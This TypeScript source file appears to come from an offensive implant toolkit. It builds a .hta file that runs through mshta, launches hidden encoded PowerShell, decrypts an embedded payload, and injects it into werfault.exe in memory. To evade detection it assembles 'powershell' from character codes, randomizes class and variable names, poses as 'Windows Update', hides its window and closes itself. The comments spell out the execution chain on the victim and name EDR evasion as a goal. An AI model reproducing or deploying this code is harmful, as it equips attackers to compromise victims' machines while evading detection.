/**
 * hta-wrapper.ts — Wraps a compiled PE binary in an HTML Application (.hta)
 * that injects the agent into werfault.exe entirely in-memory.
 * No files are written to disk on the victim machine.
 *
 * LOLBAS delivery: mshta.exe (T1218.005) — signed MS binary that natively
 * executes .hta files. Double-click or `mshta.exe payload.hta` both work.
 *
 * Execution chain on victim:
 *   1. mshta.exe opens the .hta file (native Windows association)
 *   2. VBScript creates WScript.Shell, assembles PS command from fragments
 *   3. PowerShell decrypts XOR+gzip payload from embedded base64 in memory
 *   4. C# P/Invoke injector compiled via Add-Type (random class name per build)
 *   5. werfault.exe started hidden (LOTL — Windows Error Reporting, low EDR coverage)
 *   6. PE manually mapped into werfault via VirtualAllocEx + WriteProcessMemory
 *   7. Relocations + imports resolved remotely
 *   8. CreateRemoteThread at PE entry point
 *   9. HTA window self-closes, agent runs inside werfault.exe — no files on disk
 */

import {
  encryptPayload,
  randClassName,
  randHex,
  buildCSharpInjector,
  buildPsInjectionChain,
} from "./pe-injector";

/**
 * Generate a self-contained .hta file with fileless PE injection.
 * Returns the full HTA content as a string.
 */
export function wrapPeAsHta(peBytes: Buffer): string {
  const encrypted = encryptPayload(peBytes);
  const b64Payload = encrypted.toString("base64");
  const className = randClassName();
  const csharpCode = buildCSharpInjector(className);
  const csB64 = Buffer.from(csharpCode, "utf-8").toString("base64");

  // PS reads payload + C# from environment variables set by VBScript
  const psLines = [
    `$d=[Convert]::FromBase64String($env:_HTA_D)`,
    `$cs=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($env:_HTA_CS))`,
  ];

  const chain = buildPsInjectionChain("$d", "$cs", className, "werfault.exe");
  const psScript = psLines.join(";") + ";" + chain;
  const psEnc = Buffer.from(psScript, "utf16le").toString("base64");

  // Split base64 strings for VBScript concatenation (VBS line limit ~1024 safe)
  const chunkSize = 800;
  const payloadChunks = b64Payload.match(new RegExp(`.{1,${chunkSize}}`, "g")) || [b64Payload];
  const csChunks = csB64.match(new RegExp(`.{1,${chunkSize}}`, "g")) || [csB64];

  const rnd = randHex(6);

  // Build VBScript that sets env vars and launches PS
  const vbLines: string[] = [];
  vbLines.push(`Dim ${rnd}s : Set ${rnd}s = CreateObject("WScript.Shell")`);
  vbLines.push(`Dim ${rnd}e : Set ${rnd}e = ${rnd}s.Environment("Process")`);

  // Build payload base64 in VBS variable
  vbLines.push(`Dim ${rnd}d`);
  vbLines.push(`${rnd}d = "${payloadChunks[0]}"`);
  for (let i = 1; i < payloadChunks.length; i++) {
    vbLines.push(`${rnd}d = ${rnd}d & "${payloadChunks[i]}"`);
  }
  vbLines.push(`${rnd}e("_HTA_D") = ${rnd}d`);

  // Build C# base64 in VBS variable
  vbLines.push(`Dim ${rnd}c`);
  vbLines.push(`${rnd}c = "${csChunks[0]}"`);
  for (let i = 1; i < csChunks.length; i++) {
    vbLines.push(`${rnd}c = ${rnd}c & "${csChunks[i]}"`);
  }
  vbLines.push(`${rnd}e("_HTA_CS") = ${rnd}c`);

  // Reassemble "powershell" from fragments to avoid static signatures
  vbLines.push(`Dim ${rnd}p`);
  vbLines.push(`${rnd}p = Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108)`);

  // Launch PS hidden (0 = vbHide)
  vbLines.push(`${rnd}s.Run ${rnd}p & " -nop -w h -ep b -enc ${psEnc}", 0, False`);

  // Self-close HTA
  vbLines.push(`self.close`);

  const vbScript = vbLines.join("\n");

  return `<html>
<head>
<title>Windows Update</title>
<HTA:APPLICATION
  ID="oHTA"
  APPLICATIONNAME="Windows Update"
  BORDER="none"
  SHOWINTASKBAR="no"
  SINGLEINSTANCE="yes"
  WINDOWSTATE="minimize"
/>
</head>
<body>
<script language="VBScript">
${vbScript}
</script>
</body>
</html>
`;
}
